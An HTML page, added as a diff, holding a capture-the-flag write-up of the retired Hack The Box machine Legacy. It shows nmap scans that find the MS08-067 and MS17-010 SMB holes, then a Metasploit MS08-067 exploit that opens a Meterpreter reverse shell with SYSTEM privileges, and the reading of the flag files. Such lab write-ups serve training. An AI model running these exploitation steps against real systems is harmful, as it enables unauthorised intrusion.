@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Legacy</strong></h1>
+        <em>Released: 15th March 2017 / Pwned: August 26th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Not much to learn here :/ Scan for open ports, scan for vulnerabilities on open ports using nmap's vuln scripts and use a ready-made metasploit exploit to gain NT AUTHORITY/SYSTEM privileges.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.4</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/legacy#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/legacy#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.4<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;microsoft-ds&nbsp;&nbsp;Windows&nbsp;XP&nbsp;microsoft-ds<br>
+                3389/tcp&nbsp;closed&nbsp;ms-wbt-server<br>
+                <br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose|specialized<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;XP|2003|2000|2008&nbsp;(94%),&nbsp;General&nbsp;Dynamics&nbsp;embedded&nbsp;(88%)<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_xp::sp3&nbsp;cpe:/o:microsoft:windows_server_2003::sp1&nbsp;cpe:/o:microsoft:windows_server_2003::sp2&nbsp;cpe:/o:microsoft:windows_2000::sp4&nbsp;cpe:/o:microsoft:windows_server_2008::sp2<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;(94%),&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2003&nbsp;SP1&nbsp;or&nbsp;SP2&nbsp;(92%),&nbsp;...<br>
+                Service&nbsp;Info:&nbsp;OSs:&nbsp;Windows,&nbsp;Windows&nbsp;XP;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows,&nbsp;cpe:/o:microsoft:windows_xp<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;5d00h15m43s,&nbsp;deviation:&nbsp;2h07m16s,&nbsp;median:&nbsp;4d22h45m43s<br>
+                |_nbstat:&nbsp;NetBIOS&nbsp;name:&nbsp;LEGACY,&nbsp;NetBIOS&nbsp;user:&nbsp;&lt;unknown&gt;,&nbsp;NetBIOS&nbsp;MAC:&nbsp;00:50:56:b9:96:4f&nbsp;(VMware)<br>
+                |&nbsp;smb-os-discovery:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;OS:&nbsp;Windows&nbsp;XP&nbsp;(Windows&nbsp;2000&nbsp;LAN&nbsp;Manager)<br>
+                |&nbsp;&nbsp;&nbsp;OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_xp::-<br>
+                |&nbsp;&nbsp;&nbsp;Computer&nbsp;name:&nbsp;legacy<br>
+                |&nbsp;&nbsp;&nbsp;NetBIOS&nbsp;computer&nbsp;name:&nbsp;LEGACY\x00<br>
+                |&nbsp;&nbsp;&nbsp;Workgroup:&nbsp;HTB\x00<br>
+                |_&nbsp;&nbsp;System&nbsp;time:&nbsp;2019-08-31T14:30:49+03:00<br>
+                |&nbsp;smb-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;account_used:&nbsp;guest<br>
+                |&nbsp;&nbsp;&nbsp;authentication_level:&nbsp;user<br>
+                |&nbsp;&nbsp;&nbsp;challenge_response:&nbsp;supported<br>
+                |_&nbsp;&nbsp;message_signing:&nbsp;disabled&nbsp;(dangerous,&nbsp;but&nbsp;default)<br>
+                |_smb2-time:&nbsp;Protocol&nbsp;negotiation&nbsp;failed&nbsp;(SMB2)<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;266.62&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 139/smb - Can't login because no credentials and NULL session isn't allowed<br>
+        • 445/smb - Encrypted SMB. Same situation as 139<br>
+        • 3389/rdp - RDP. Tshe port is closed so nothing can be done here<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Nmap Vuln Scripts</strong></h2><br>
+        There's no information to collect or progress to be made with the state of the current ports found above.<br>
+        <br>
+        Try running nmap's “vuln� scripts against each of the services to scan the target for vulnerabilities.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/legacy#&nbsp;nmap&nbsp;-p&nbsp;139,445,3389&nbsp;--script&nbsp;"vuln"&nbsp;10.10.10.4<br>
+                ...<br>
+                Pre-scan&nbsp;script&nbsp;results:<br>
+                |&nbsp;broadcast-avahi-dos:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Discovered&nbsp;hosts:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;224.0.0.251<br>
+                |&nbsp;&nbsp;&nbsp;After&nbsp;NULL&nbsp;UDP&nbsp;avahi&nbsp;packet&nbsp;DoS&nbsp;(CVE-2011-1002).<br>
+                |_&nbsp;&nbsp;Hosts&nbsp;are&nbsp;all&nbsp;up&nbsp;(not&nbsp;vulnerable).<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.4<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.042s&nbsp;latency).<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE<br>
+                139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;microsoft-ds<br>
+                3389/tcp&nbsp;closed&nbsp;ms-wbt-server<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_samba-vuln-cve-2012-1182:&nbsp;NT_STATUS_ACCESS_DENIED<br>
+                |&nbsp;smb-vuln-ms08-067:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;VULNERABLE:<br>
+                |&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;system&nbsp;vulnerable&nbsp;to&nbsp;remote&nbsp;code&nbsp;execution&nbsp;(MS08-067)<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State:&nbsp;LIKELY&nbsp;VULNERABLE<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDs:&nbsp;&nbsp;CVE:CVE-2008-4250<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;Server&nbsp;service&nbsp;in&nbsp;Microsoft&nbsp;Windows&nbsp;2000&nbsp;SP4,&nbsp;XP&nbsp;SP2&nbsp;and&nbsp;SP3,&nbsp;Server&nbsp;2003&nbsp;SP1&nbsp;and&nbsp;SP2,<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vista&nbsp;Gold&nbsp;and&nbsp;SP1,&nbsp;Server&nbsp;2008,&nbsp;and&nbsp;7&nbsp;Pre-Beta&nbsp;allows&nbsp;remote&nbsp;attackers&nbsp;to&nbsp;execute&nbsp;arbitrary<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;via&nbsp;a&nbsp;crafted&nbsp;RPC&nbsp;request&nbsp;that&nbsp;triggers&nbsp;the&nbsp;overflow&nbsp;during&nbsp;path&nbsp;canonicalization.<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;date:&nbsp;2008-10-23<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://technet.microsoft.com/en-us/library/security/ms08-067.aspx<br>
+                |_smb-vuln-ms10-054:&nbsp;false<br>
+                |_smb-vuln-ms10-061:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                |&nbsp;smb-vuln-ms17-010:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;VULNERABLE:<br>
+                |&nbsp;&nbsp;&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;vulnerability&nbsp;in&nbsp;Microsoft&nbsp;SMBv1&nbsp;servers&nbsp;(ms17-010)<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State:&nbsp;VULNERABLE<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDs:&nbsp;&nbsp;CVE:CVE-2017-0143<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Risk&nbsp;factor:&nbsp;HIGH<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;critical&nbsp;remote&nbsp;code&nbsp;execution&nbsp;vulnerability&nbsp;exists&nbsp;in&nbsp;Microsoft&nbsp;SMBv1<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servers&nbsp;(ms17-010).<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;date:&nbsp;2017-03-14<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143<br>
+                <br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;42.17&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        Nmap found 2 potential vulnerabilities, both of which are smb vulns - <code>MS08-067</code> and <code>ms17-010</code>.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) metasploit MS08-067</strong></h2><br>
+        Open metasploit with <code>msfconsole</code> and search for an <code>ms08-067</code> exploit in metasploit.<br>
+        Point the exploit at the target and run it.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/legacy#&nbsp;msfconsole<br>
+                ...<br>
+                msf5&nbsp;&gt;&nbsp;search&nbsp;ms08-067<br>
+                <br>
+                Matching&nbsp;Modules<br>
+                ================<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;Date&nbsp;&nbsp;Rank&nbsp;&nbsp;&nbsp;Check&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;-----&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;exploit/windows/smb/ms08_067_netapi&nbsp;&nbsp;2008-10-28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;great&nbsp;&nbsp;Yes&nbsp;&nbsp;&nbsp;&nbsp;MS08-067&nbsp;Microsoft&nbsp;Server&nbsp;Service&nbsp;Relative&nbsp;Path&nbsp;Stack&nbsp;Corruption<br>
+                <br>
+                <br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/smb/ms08_067_netapi<br>
+                msf5&nbsp;exploit(windows/smb/ms08_067_netapi)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(exploit/windows/smb/ms08_067_netapi):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address&nbsp;range&nbsp;or&nbsp;CIDR&nbsp;identifier<br>
+                &nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;SMB&nbsp;service&nbsp;port&nbsp;(TCP)<br>
+                &nbsp;&nbsp;&nbsp;SMBPIPE&nbsp;&nbsp;BROWSER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;pipe&nbsp;name&nbsp;to&nbsp;use&nbsp;(BROWSER,&nbsp;SRVSVC)<br>
+                <br>
+                <br>
+                Exploit&nbsp;target:<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic&nbsp;Targeting<br>
+                <br>
+                <br>
+                msf5&nbsp;exploit(windows/smb/ms08_067_netapi)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.4<br>
+                RHOSTS&nbsp;=&gt;&nbsp;10.10.10.4<br>
+                msf5&nbsp;exploit(windows/smb/ms08_067_netapi)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.3:4444&nbsp;<br>
+                [*]&nbsp;10.10.10.4:445&nbsp;-&nbsp;Automatically&nbsp;detecting&nbsp;the&nbsp;target...<br>
+                [*]&nbsp;10.10.10.4:445&nbsp;-&nbsp;Fingerprint:&nbsp;Windows&nbsp;XP&nbsp;-&nbsp;Service&nbsp;Pack&nbsp;3&nbsp;-&nbsp;lang:Unknown<br>
+                [*]&nbsp;10.10.10.4:445&nbsp;-&nbsp;We&nbsp;could&nbsp;not&nbsp;detect&nbsp;the&nbsp;language&nbsp;pack,&nbsp;defaulting&nbsp;to&nbsp;English<br>
+                [*]&nbsp;10.10.10.4:445&nbsp;-&nbsp;Selected&nbsp;Target:&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;English&nbsp;(AlwaysOn&nbsp;NX)<br>
+                [*]&nbsp;10.10.10.4:445&nbsp;-&nbsp;Attempting&nbsp;to&nbsp;trigger&nbsp;the&nbsp;vulnerability...<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.4<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.3:4444&nbsp;-&gt;&nbsp;10.10.10.4:1031)&nbsp;at&nbsp;2019-08-26&nbsp;12:10:59&nbsp;+0100<br>
+                <br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;getuid<br>
+                Server&nbsp;username:&nbsp;NT&nbsp;AUTHORITY\SYSTEM
+            </div>
+        </div><br>
+        <br>
+        We have SYSTEM privileges!<br>
+        *Note that if the exploit doesn't work (or you get a timeout error), try resetting the box. Someone has probably already exploited the machine*<br>
+        <br>
+        Go grab <code>user.txt</code> and <code>root.txt</code> from <code>john</code> and <code>Administrator</code>'s desktop.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;pwd<br>
+                C:\WINDOWS\system32<br>
+                meterpreter&nbsp;&gt;&nbsp;cd&nbsp;../../<br>
+                meterpreter&nbsp;&gt;&nbsp;ls<br>
+                Listing:&nbsp;C:\<br>
+                ============<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;Last&nbsp;modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                100777/rwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:30:44&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AUTOEXEC.BAT<br>
+                100666/rw-rw-rw-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:30:44&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONFIG.SYS<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:29&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents&nbsp;and&nbsp;Settings<br>
+                100444/r--r--r--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:30:44&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IO.SYS<br>
+                100444/r--r--r--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:30:44&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSDOS.SYS<br>
+                100555/r-xr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;47564&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2008-04-13&nbsp;21:13:04&nbsp;+0100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTDETECT.COM<br>
+                40555/r-xr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:57&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:30&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System&nbsp;Volume&nbsp;Information<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:18:34&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WINDOWS<br>
+                100666/rw-rw-rw-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;211&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:02&nbsp;+0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boot.ini<br>
+                100444/r--r--r--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;250048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2008-04-13&nbsp;23:01:44&nbsp;+0100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ntldr<br>
+                236011474/r--rwxr--&nbsp;&nbsp;99075549669916655&nbsp;&nbsp;fif&nbsp;&nbsp;&nbsp;3148583492-11-30&nbsp;05:22:08&nbsp;+0000&nbsp;&nbsp;pagefile.sys<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;cd&nbsp;Documents\&nbsp;and\&nbsp;Settings&nbsp;<br>
+                meterpreter&nbsp;&gt;&nbsp;ls<br>
+                Listing:&nbsp;C:\Documents&nbsp;and&nbsp;Settings<br>
+                ==================================<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;Type&nbsp;&nbsp;Last&nbsp;modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;06:07:20&nbsp;+0000&nbsp;&nbsp;Administrator<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:29&nbsp;+0000&nbsp;&nbsp;All&nbsp;Users<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:20:29&nbsp;+0000&nbsp;&nbsp;Default&nbsp;User<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:32:52&nbsp;+0000&nbsp;&nbsp;LocalService<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:32:42&nbsp;+0000&nbsp;&nbsp;NetworkService<br>
+                40777/rwxrwxrwx&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir&nbsp;&nbsp;&nbsp;2017-03-16&nbsp;05:33:41&nbsp;+0000&nbsp;&nbsp;john<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;cat&nbsp;Administrator/Desktop/root.txt<br>
+                993442...<br>
+                meterpreter&nbsp;&gt;&nbsp;cat&nbsp;john/Desktop/user.txt<br>
+                e69af0...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
